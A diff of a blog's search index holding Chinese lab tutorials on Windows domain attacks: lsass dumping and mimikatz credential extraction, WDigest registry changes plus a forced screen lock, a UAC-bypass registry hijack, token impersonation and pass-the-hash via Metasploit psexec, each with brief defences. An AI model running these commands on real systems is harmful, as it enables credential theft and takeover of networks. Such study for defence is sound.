+<h4 id="使用mimikatz离线读取lsass-dmp文件（mimikatz被杀软拦截）"><a href="#使用mimikatz离线读取lsass-dmp文件（mimikatz被杀软拦截）" class="headerlink" title="使用mimikatz离线读取lsass.dmp文件（mimikatz被杀软拦截）"></a>使用mimikatz离线读取lsass.dmp文件（mimikatz被杀软拦截）</h4><p>（1）导出<code>lsass.dmp</code>文件</p>
+<p>通过 <code>procdump.exe</code> 文件导出<code>lsass.dmp</code>文件（Procdump是微软官方发布的工具，可以在命令行下将目标lsass文件导出，且杀毒软件不会拦截）</p>
+<p><code>procdump</code>下载地址：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</a></p>
+<p><strong>管理员权限运行</strong>该命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210207215155.png" alt="image-20210207214123607"></p>
+<p>(2）使用mimikatz导出lsass.dmp文件中的密码散列值</p>
+<p>将目标机器上的 <code>lsass.tmp</code> 拉取到本地，与<code>mimikatz</code>同目录，使用<code>mimikatz</code>解密目标系统密码。（本地机器需与目标机器的版本位数一致）</p>
+<p>运行mimikatz.exe 解密该文件。注：32位就用32位的<code>mimikatz</code>破解，同理64位的也是。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::minidump lsass.dmp</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210207213854.png" alt="image-20210207213852318"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210207214737.png" alt="image-20210207214733408"></p>
+<h4 id="mimikatz无法读取到密码时"><a href="#mimikatz无法读取到密码时" class="headerlink" title="mimikatz无法读取到密码时"></a>mimikatz无法读取到密码时</h4><p>在默认情况下，当系统为<strong>Windows 2012R2</strong>以上或者安装 <strong>KB2871997</strong> 补丁时，默认在内存缓存中禁止保存明文密码，密码字段显示为null，此时可以通过以下方式开启，但需要用户重新登录后才能成功抓取。</p>
+<p><strong>开启Wdigest Auth</strong></p>
+<ul>
+<li><p>cmd</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>powershell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>meterpreter</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 1</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>关闭Wdigest Auth</strong></p>
+<p>关闭命令如下：</p>
+<ul>
+<li><p>cmd</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>powershell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 0</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>meterpreter</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 0</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>强制锁屏</strong></p>
+<p>在开启 <code>Wdigest Auth</code> 后，需要管理员重新登录才能抓明文密码。</p>
+<p>强制锁屏，让管理员重新登录。</p>
+<ul>
+<li><p>cmd</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rundll32 user32.dll,LockWorkStation</span><br></pre></td></tr></table></figure>
+
+<p>等待管理员重新登录，之后重新读取，可读到明文密码。</p>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>域渗透</category>
+      </categories>
+      <tags>
+        <tag>Windows提权</tag>
+        <tag>域渗透</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>git 蜜罐复现</title>
     <url>/2021/08/09/git%20%E8%9C%9C%E7%BD%90%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<blockquote>
@@ -1171,10 +1222,10 @@
 </ul>
 ]]></content>
       <categories>
-        <category>GitHub工具</category>
+        <category>开源工具</category>
       </categories>
       <tags>
-        <tag>GitHub工具</tag>
+        <tag>开源工具</tag>
       </tags>
   </entry>
   <entry>
@@ -1281,6 +1332,86 @@
       </tags>
   </entry>
   <entry>
+    <title>令牌窃取分析及防范</title>
+    <url>/2021/01/29/%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E8%8C%83/</url>
+    <content><![CDATA[<blockquote>
+<p>  快过年了，小伙伴们提议出去浪一下，决定要去玩恐怖类密室逃脱，瑟瑟发抖o((⊙﹏⊙))o.</p>
+</blockquote>
+<h2 id="令牌窃取分析及防范"><a href="#令牌窃取分析及防范" class="headerlink" title="令牌窃取分析及防范"></a>令牌窃取分析及防范</h2><h2 id="0x01-令牌概述"><a href="#0x01-令牌概述" class="headerlink" title="0x01 令牌概述"></a>0x01 令牌概述</h2><p>令牌( Token )是指系统中的临时密钥，相当于账户和密码，用于决定是否允许当前请求及判断当前请求是属于哪个用户的。获得了令牌，就可以在不提供密码或其他凭证的情况下访问网络和系统资源。这些令牌将持续存在于系统中(除非系统重新启动)。</p>
+<p>令牌的最大特点是随机性和不可预测性，一般的攻击者或软件都无法将令牌猜测出来。令牌一般分为以下几种：</p>
+<ul>
+<li>访问令牌(Access Token) 代表访问控制操作主体的系统对象。(本文主要讲Windows的AccessToken)</li>
+<li>密保令牌(Security Token) 也叫作认证令牌或者硬件令牌，是一种用于实现计算机身份校验的物理设备，例如U盾。</li>
+<li>会话令牌 ( SessionToken)是交互会话中唯一的身份标识符。</li>
+</ul>
+<h4 id="Windows访问令牌"><a href="#Windows访问令牌" class="headerlink" title="Windows访问令牌"></a>Windows访问令牌</h4><p>Windows 访问令牌(Access Tokens) 是一个描述进程或线程安全上下文的对象。令牌所包含的信息是与该用户账户相关的进程或线程的身份和权限信息。当用户登录时，系统通过将用户输入的密码与储存在安全数据库中的密码进行对比。若密码正确，系统将生成一个访问令牌。之后，该用户执行的每个进程都会拥有一个该访问令牌的副本。</p>
+<p>目前访问令牌分为两种令牌：</p>
+<ul>
+<li>主令牌（每一个进程都具有一个唯一的主令牌，进程通过主令牌被开启）</li>
+<li>模拟令牌（在默认的情况下，当线程被开启的时候，所在进程的主令牌会自动附加到当前线程上，作为线程的安全上下文。而线程可以运行在另一个非主令牌的访问令牌下执行，而这个令牌被称为模拟令牌。而指定线程的模拟令牌的过程被称为模拟）</li>
+</ul>
+<p>主令牌是与进程相关的；模拟的令牌是与模拟令牌的线程相关的。主令牌和模拟令牌，都会在系统重启或者关机后全部清除。</p>
+<p>当线程与安全对象进行交互或尝试执行需要特权的系统任务时，系统使用访问令牌来标识用户。访问令牌包含以下信息：</p>
+<ul>
+<li>用户帐户的安全标识符(SID)</li>
+<li>用户帐户所属的用户群的SIDs</li>
+<li>一个logon SID，标识当前登录会话</li>
+<li>用户或用户群的特权清单</li>
+<li>所有者的SID</li>
+<li>基本群的SID</li>
+<li>当用户创建可安全对象（securable object）且没有给出安全描述符时，系统使用的缺省的自主访问控制列表（DACL）</li>
+<li>访问令牌资源</li>
+<li>是否为primary或impersonation token</li>
+<li>限制性SIDs的可选列表</li>
+<li>当前impersonation级别</li>
+<li>其他统计</li>
+</ul>
+<p>攻击者可以使用访问令牌在不同的用户或系统安全性上下文下进行操作，以执行操作并逃避检测。</p>
+<p>攻击者可以使用内置的Windows API函数来复制现有进程中的访问令牌。这被称为令牌窃取。</p>
+<p>攻击者必须已经在特权用户上下文（即管理员）中才能窃取令牌。攻击者通常使用令牌窃取将其安全上下文从管理员级别提升到SYSTEM级别。如果帐户对远程系统具有适当的权限，则对手可以使用令牌作为该令牌的帐户向远程系统进行身份验证。</p>
+<p><strong>列举令牌只能列出当前用户和比当前用户权限更低用户的令牌，例如当前权限是system或者是administrator，那么我们就可以看到系统中所有的令牌。</strong></p>
+<h2 id="0x02-令牌窃取"><a href="#0x02-令牌窃取" class="headerlink" title="0x02 令牌窃取"></a>0x02 令牌窃取</h2><h5 id="使用MSF中的-incognito-插件"><a href="#使用MSF中的-incognito-插件" class="headerlink" title="使用MSF中的 incognito 插件"></a>使用MSF中的 incognito 插件</h5><p>由于我当前的权限是一个普通用户，所以令牌窃取只能窃取到当前用户本身</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085126.png" alt="image-20210129091617259"></p>
+<p>利用上一节<strong>Windows提权-BypassUAC之劫持注册表实验</strong> ，使用UAC提权，先另起一个MSF监听，然后在本sessoin中的shell中执行</p>
+<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKCU\Software\Classes\mscfile\shell\open\command&quot;</span> /d c:\testftp\<span class="keyword">shell</span>.exe /f</span><br><span class="line"></span><br><span class="line">eventvwr.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085131.png" alt="image-20210128223604660"></p>
+<blockquote>
+<p>  Delegation Token：也就是授权令牌，它支持交互式登录(例如可以通过远程桌面登录访问)</p>
+<p>   Impresonation Token：模拟令牌，它是非交互的会话。</p>
+</blockquote>
+<p>得到授权令牌：		</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NT AUTHORITY\IUSR</span><br><span class="line">NT AUTHORITY\LOCAL SERVICE</span><br><span class="line">NT AUTHORITY\NETWORK SERVICE</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line">TEST\Administrator</span><br><span class="line">TEST\yhy</span><br></pre></td></tr></table></figure>
+
+<p>得到模拟令牌：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NT AUTHORITY\ANONYMOUS LOGON</span><br></pre></td></tr></table></figure>
+
+<p>伪造授权令牌，就可以拥有它的权限了，使用下面命令获取对应token的权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impersonate_token &#x27;TEST\Administrator&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085137.png" alt="image-20210128223730735"></p>
+<p>使用<code>drop_token</code>返回之前的token，和 <code>rev2self</code> 一样</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085141.png" alt="image-20210128223804482"></p>
+<p>Windows 访问令牌是用户登录后分配的用于标识用户权限的对象，通过复制令牌，我们可以摸拟该令牌代表的用户。典型的用法是获取 SYSTEM 权限，以及查看本机是否有域控账号的令牌，然后窃取该令牌，从而控制整个域。</p>
+<h2 id="0x03-令牌窃取提权的防御措施"><a href="#0x03-令牌窃取提权的防御措施" class="headerlink" title="0x03 令牌窃取提权的防御措施"></a>0x03 令牌窃取提权的防御措施</h2><p>针对令牌窃取提权的防御措施如下：</p>
+<ul>
+<li>为了防止域管理员的令牌被窃取，应该禁止域管理员登录其它主机。如果登录了，使用完后应该及时重启电脑，从而把令牌清除。</li>
+<li>及时安装微软推送的补丁</li>
+<li>对于来路不明的或者危险的软件，既不要在系统中使用，也不要在虚拟机中使用</li>
+<li>对令牌的时效性进行限制，以防止散列值被破解后泄露有效的令牌信息</li>
+<li>对于令牌，应采取加密存储及多长验证保护</li>
+<li>使用加密链路SSL&#x2F;TLS传输令牌，以防止被中间人窃听</li>
+</ul>
+]]></content>
+      <categories>
+        <category>域渗透</category>
+      </categories>
+      <tags>
+        <tag>Windows提权</tag>
+        <tag>域渗透</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>sqlmap关于os-shell小记</title>
     <url>/2020/11/06/sqlmap%E5%85%B3%E4%BA%8Eos-shell%E5%B0%8F%E8%AE%B0/</url>
     <content><![CDATA[<h1 id="SqlMap-–os-shell-利用"><a href="#SqlMap-–os-shell-利用" class="headerlink" title="SqlMap –os-shell 利用"></a>SqlMap –os-shell 利用</h1><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><ol>
@@ -1369,86 +1500,6 @@
       <tags>
         <tag>sqlmap使用</tag>
         <tag>getshell</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>令牌窃取分析及防范</title>
-    <url>/2021/01/29/%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E8%8C%83/</url>
-    <content><![CDATA[<blockquote>
-<p>  快过年了，小伙伴们提议出去浪一下，决定要去玩恐怖类密室逃脱，瑟瑟发抖o((⊙﹏⊙))o.</p>
-</blockquote>
-<h2 id="令牌窃取分析及防范"><a href="#令牌窃取分析及防范" class="headerlink" title="令牌窃取分析及防范"></a>令牌窃取分析及防范</h2><h2 id="0x01-令牌概述"><a href="#0x01-令牌概述" class="headerlink" title="0x01 令牌概述"></a>0x01 令牌概述</h2><p>令牌( Token )是指系统中的临时密钥，相当于账户和密码，用于决定是否允许当前请求及判断当前请求是属于哪个用户的。获得了令牌，就可以在不提供密码或其他凭证的情况下访问网络和系统资源。这些令牌将持续存在于系统中(除非系统重新启动)。</p>
-<p>令牌的最大特点是随机性和不可预测性，一般的攻击者或软件都无法将令牌猜测出来。令牌一般分为以下几种：</p>
-<ul>
-<li>访问令牌(Access Token) 代表访问控制操作主体的系统对象。(本文主要讲Windows的AccessToken)</li>
-<li>密保令牌(Security Token) 也叫作认证令牌或者硬件令牌，是一种用于实现计算机身份校验的物理设备，例如U盾。</li>
-<li>会话令牌 ( SessionToken)是交互会话中唯一的身份标识符。</li>
-</ul>
-<h4 id="Windows访问令牌"><a href="#Windows访问令牌" class="headerlink" title="Windows访问令牌"></a>Windows访问令牌</h4><p>Windows 访问令牌(Access Tokens) 是一个描述进程或线程安全上下文的对象。令牌所包含的信息是与该用户账户相关的进程或线程的身份和权限信息。当用户登录时，系统通过将用户输入的密码与储存在安全数据库中的密码进行对比。若密码正确，系统将生成一个访问令牌。之后，该用户执行的每个进程都会拥有一个该访问令牌的副本。</p>
-<p>目前访问令牌分为两种令牌：</p>
-<ul>
-<li>主令牌（每一个进程都具有一个唯一的主令牌，进程通过主令牌被开启）</li>
-<li>模拟令牌（在默认的情况下，当线程被开启的时候，所在进程的主令牌会自动附加到当前线程上，作为线程的安全上下文。而线程可以运行在另一个非主令牌的访问令牌下执行，而这个令牌被称为模拟令牌。而指定线程的模拟令牌的过程被称为模拟）</li>
-</ul>
-<p>主令牌是与进程相关的；模拟的令牌是与模拟令牌的线程相关的。主令牌和模拟令牌，都会在系统重启或者关机后全部清除。</p>
-<p>当线程与安全对象进行交互或尝试执行需要特权的系统任务时，系统使用访问令牌来标识用户。访问令牌包含以下信息：</p>
-<ul>
-<li>用户帐户的安全标识符(SID)</li>
-<li>用户帐户所属的用户群的SIDs</li>
-<li>一个logon SID，标识当前登录会话</li>
-<li>用户或用户群的特权清单</li>
-<li>所有者的SID</li>
-<li>基本群的SID</li>
-<li>当用户创建可安全对象（securable object）且没有给出安全描述符时，系统使用的缺省的自主访问控制列表（DACL）</li>
-<li>访问令牌资源</li>
-<li>是否为primary或impersonation token</li>
-<li>限制性SIDs的可选列表</li>
-<li>当前impersonation级别</li>
-<li>其他统计</li>
-</ul>
-<p>攻击者可以使用访问令牌在不同的用户或系统安全性上下文下进行操作，以执行操作并逃避检测。</p>
-<p>攻击者可以使用内置的Windows API函数来复制现有进程中的访问令牌。这被称为令牌窃取。</p>
-<p>攻击者必须已经在特权用户上下文（即管理员）中才能窃取令牌。攻击者通常使用令牌窃取将其安全上下文从管理员级别提升到SYSTEM级别。如果帐户对远程系统具有适当的权限，则对手可以使用令牌作为该令牌的帐户向远程系统进行身份验证。</p>
-<p><strong>列举令牌只能列出当前用户和比当前用户权限更低用户的令牌，例如当前权限是system或者是administrator，那么我们就可以看到系统中所有的令牌。</strong></p>
-<h2 id="0x02-令牌窃取"><a href="#0x02-令牌窃取" class="headerlink" title="0x02 令牌窃取"></a>0x02 令牌窃取</h2><h5 id="使用MSF中的-incognito-插件"><a href="#使用MSF中的-incognito-插件" class="headerlink" title="使用MSF中的 incognito 插件"></a>使用MSF中的 incognito 插件</h5><p>由于我当前的权限是一个普通用户，所以令牌窃取只能窃取到当前用户本身</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085126.png" alt="image-20210129091617259"></p>
-<p>利用上一节<strong>Windows提权-BypassUAC之劫持注册表实验</strong> ，使用UAC提权，先另起一个MSF监听，然后在本sessoin中的shell中执行</p>
-<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKCU\Software\Classes\mscfile\shell\open\command&quot;</span> /d c:\testftp\<span class="keyword">shell</span>.exe /f</span><br><span class="line"></span><br><span class="line">eventvwr.exe</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085131.png" alt="image-20210128223604660"></p>
-<blockquote>
-<p>  Delegation Token：也就是授权令牌，它支持交互式登录(例如可以通过远程桌面登录访问)</p>
-<p>   Impresonation Token：模拟令牌，它是非交互的会话。</p>
-</blockquote>
-<p>得到授权令牌：		</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NT AUTHORITY\IUSR</span><br><span class="line">NT AUTHORITY\LOCAL SERVICE</span><br><span class="line">NT AUTHORITY\NETWORK SERVICE</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line">TEST\Administrator</span><br><span class="line">TEST\yhy</span><br></pre></td></tr></table></figure>
-
-<p>得到模拟令牌：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NT AUTHORITY\ANONYMOUS LOGON</span><br></pre></td></tr></table></figure>
-
-<p>伪造授权令牌，就可以拥有它的权限了，使用下面命令获取对应token的权限</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impersonate_token &#x27;TEST\Administrator&#x27;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085137.png" alt="image-20210128223730735"></p>
-<p>使用<code>drop_token</code>返回之前的token，和 <code>rev2self</code> 一样</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085141.png" alt="image-20210128223804482"></p>
-<p>Windows 访问令牌是用户登录后分配的用于标识用户权限的对象，通过复制令牌，我们可以摸拟该令牌代表的用户。典型的用法是获取 SYSTEM 权限，以及查看本机是否有域控账号的令牌，然后窃取该令牌，从而控制整个域。</p>
-<h2 id="0x03-令牌窃取提权的防御措施"><a href="#0x03-令牌窃取提权的防御措施" class="headerlink" title="0x03 令牌窃取提权的防御措施"></a>0x03 令牌窃取提权的防御措施</h2><p>针对令牌窃取提权的防御措施如下：</p>
-<ul>
-<li>为了防止域管理员的令牌被窃取，应该禁止域管理员登录其它主机。如果登录了，使用完后应该及时重启电脑，从而把令牌清除。</li>
-<li>及时安装微软推送的补丁</li>
-<li>对于来路不明的或者危险的软件，既不要在系统中使用，也不要在虚拟机中使用</li>
-<li>对令牌的时效性进行限制，以防止散列值被破解后泄露有效的令牌信息</li>
-<li>对于令牌，应采取加密存储及多长验证保护</li>
-<li>使用加密链路SSL&#x2F;TLS传输令牌，以防止被中间人窃听</li>
-</ul>
-]]></content>
-      <categories>
-        <category>域渗透</category>
-      </categories>
-      <tags>
-        <tag>Windows提权</tag>
-        <tag>域渗透</tag>
       </tags>
   </entry>
   <entry>
@@ -1646,61 +1697,6 @@
       </tags>
   </entry>
   <entry>
-    <title>哈希传递</title>
-    <url>/2021/02/14/%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/</url>
-    <content><![CDATA[<blockquote>
-<p>  笙歌间错华筵启。喜新春新岁。菜传纤手青丝细。和气入、东风里。</p>
-<p>  幡儿胜儿都姑媂。戴得更忔戏。愿新春以后，吉吉利利，百事都如意。 </p>
-</blockquote>
-<h2 id="0x01-哈希传递攻击概念"><a href="#0x01-哈希传递攻击概念" class="headerlink" title="0x01 哈希传递攻击概念"></a>0x01 哈希传递攻击概念</h2><p>在域环境中，用户登录计算机时使用的大都是域账号，大量计算机在安装时会使用相同的本地管理员账号和密码，因此，如果计算机的本地管理员账号和密码也是相同的，攻击者就能使用哈希传递攻击的方法登陆内网中的其他计算机。</p>
-<p>在Windows系统中，通常会使用NTLM身份认证，NTLM认证不使用明文口令，而是使用口令加密后的hash值，hash值由系统API生成(例如LsaLogonUser)。攻击者获得有效的用户名和用户密码哈希值后，他们便能够使用该信息通过LM或NTLM身份验证向远程服务器或服务进行身份验证，而无需进行<strong>暴力破解</strong>散列以获取明文密码（此技术发布之前需要此密码）。该攻击利用了身份验证协议中的一种实现缺陷，即每次<strong>会话之间</strong>的密码散列保持静态，直到下次更改密码为止。</p>
-<p>从Windows Vista和Windows Server 2008开始，微软默认禁用LM hash。在Windows Server 2012 R2及之后版本的操作系统中，默认不会在内存中保存明文密码，Mimikatz 就读不到密码明文，只能读取哈希值。虽然此时可以通过修改注册表的方式抓取明文，但需要用户重新登录后才能成功抓取。修改注册表命令为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure>
-
-<p>但是，这种方式要求系统重启或者用户重新登录，在实战中操作起来成功率还是比较低的。如果攻击者拥有用户密码的哈希值，则无需强行使用明文密码；他们可以简单地使用他们已经收获的任意用户帐户的哈希值来针对远程系统进行身份验证并模拟该用户。换句话说，从攻击者的角度来看，哈希在功能上等同于生成它们的原始密码。</p>
-<p>因此，攻击者如果使用工具将散列值传递到其他计算机中，进行权限验证，就能够在身份验证的时候模拟该用户(即跳过调用API生成hash的过程)，实现对计算机的控制。</p>
-<h2 id="0x02-利用方法"><a href="#0x02-利用方法" class="headerlink" title="0x02 利用方法"></a>0x02 利用方法</h2><h3 id="环境搭配"><a href="#环境搭配" class="headerlink" title="环境搭配"></a>环境搭配</h3><p>域搭建可以参考<a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247483820&idx=1&sn=f49f393a5698e366df99ddd0d9269829&chksm=c28298b5f5f511a36cd92fb722ce3b0658a9ee6195f5ad3f89266a4dc2ac3f022fdc8d5b578e#rd">Windows组策略提权实验</a></p>
-<p>将一台win7添加到域控（win8）中</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160244.png" alt="image-20210214145116625"></p>
-<p>登录一下域账户，之后退出域账户，然后切换为本地账户</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160250.png" alt="image-20210214145726732"></p>
-<p>切换本地账户</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160257.png" alt="image-20210214145957319"></p>
-<h3 id="Mimikatz-交互式获取"><a href="#Mimikatz-交互式获取" class="headerlink" title="Mimikatz 交互式获取"></a>Mimikatz 交互式获取</h3><p>读取lsass进程的信息，获取hash</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonPasswords</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160302.png" alt="image-20210214152209729"></p>
-<p>获取终端</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:administrator /domain:workgroup /ntlm:4075bdc2e63781b034a034102356063a</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160306.png" alt="image-20210214152128620"></p>
-<p>会弹出一个交互式的终端,这个终端以及伪造为我们指定的hash和用户，可以直接访问smb服务，我们可以通过copy文件，然后执行计划任务去拿到shell（使用atexec攻击）。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160310.png" alt="image-20210214152835360"></p>
-<h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><p>需要使用<code>exploit/windows/smb/psexec</code></p>
-<p>注意这里填入的哈希是<code>LM Hash:NTLM Hash</code>, 当系统默认不支持LM hash，LM hash可以设定为任意值。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set RHOST 172.16.27.10</span><br><span class="line">set smbuser administrator</span><br><span class="line">set SMBPass 00000000000000000000000000000000:4075bdc2e63781b034a034102356063a</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160316.png" alt="image-20210214154108503"></p>
-<p>当然还有一些其它利用方法，比如：Cobalt Strike 抓取、powershell读取、 SAM表离线获取hash、wmiexec利用hash获取shell等等</p>
-<h2 id="0x03-防范措施"><a href="#0x03-防范措施" class="headerlink" title="0x03 防范措施"></a>0x03 防范措施</h2><h3 id="KB2871997补丁的影响"><a href="#KB2871997补丁的影响" class="headerlink" title="KB2871997补丁的影响"></a>KB2871997补丁的影响</h3><p>防范首先想到打补丁，微软也早在2014年5月发布了KB2871997补丁，该补丁禁止通过本地管理员权限与远程计算机进行连接，其后果就是：无法通过本地管理员权限对远程计算机使用Psexec、WMI、smbecec等，也无法访问远程的文件共享等。</p>
-<p>但实际上就算打了KB2871997补丁后，Administrator账号(SID为500)也是例外的，使用该账户的NTLM Hash依然可以进行哈希传递。</p>
-<blockquote>
-<p>  KB2871997补丁并不能真正防止哈希传递，只是在一定程度上缓解了PTH的问题。</p>
-<p>  浅探内网横向移动-Pass The Hash  <a href="https://xz.aliyun.com/t/8117#toc-11">https://xz.aliyun.com/t/8117#toc-11</a></p>
-<p>  KB22871997是否真的能防御PTH攻击？<a href="https://www.anquanke.com/post/id/193150">https://www.anquanke.com/post/id/193150</a></p>
-</blockquote>
-<h3 id="防御-mimikatz-攻击"><a href="#防御-mimikatz-攻击" class="headerlink" title="防御 mimikatz 攻击"></a>防御 mimikatz 攻击</h3><p>mimikatz在抓取散列值或明文密码时，需要用到Debug权限（因为mimikatz需要和lsass进程进行交互，如果没有Debug权限，mimikatz将不能读取lsass进程里的密码）。而Debug权限归本地管理员Administrator所有,目的是确定哪些用户可以将调试器附加到任何进程或内核中，但一般Administrator不会用到这个权限(除非是系统进程)。<br><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160322.png" alt="image-20210214155950651"></p>
-<p>所以在配置用户权限时，可以将拥有Debug权限的本地管理员从Administrator组中移除。重启系统之后，在运行mimikatz，在第一步”privilege::debug”时就会报错了。</p>
-]]></content>
-      <categories>
-        <category>域渗透</category>
-      </categories>
-      <tags>
-        <tag>Windows提权</tag>
-        <tag>域渗透</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>初探Java反序列化漏洞(二)</title>
     <url>/2021/05/02/%E5%88%9D%E6%8E%A2Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(%E4%BA%8C)/</url>
     <content><![CDATA[<blockquote>
@@ -1764,6 +1760,61 @@
       </tags>
   </entry>
   <entry>
+    <title>哈希传递</title>
+    <url>/2021/02/14/%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/</url>
+    <content><![CDATA[<blockquote>
+<p>  笙歌间错华筵启。喜新春新岁。菜传纤手青丝细。和气入、东风里。</p>
+<p>  幡儿胜儿都姑媂。戴得更忔戏。愿新春以后，吉吉利利，百事都如意。 </p>
+</blockquote>
+<h2 id="0x01-哈希传递攻击概念"><a href="#0x01-哈希传递攻击概念" class="headerlink" title="0x01 哈希传递攻击概念"></a>0x01 哈希传递攻击概念</h2><p>在域环境中，用户登录计算机时使用的大都是域账号，大量计算机在安装时会使用相同的本地管理员账号和密码，因此，如果计算机的本地管理员账号和密码也是相同的，攻击者就能使用哈希传递攻击的方法登陆内网中的其他计算机。</p>
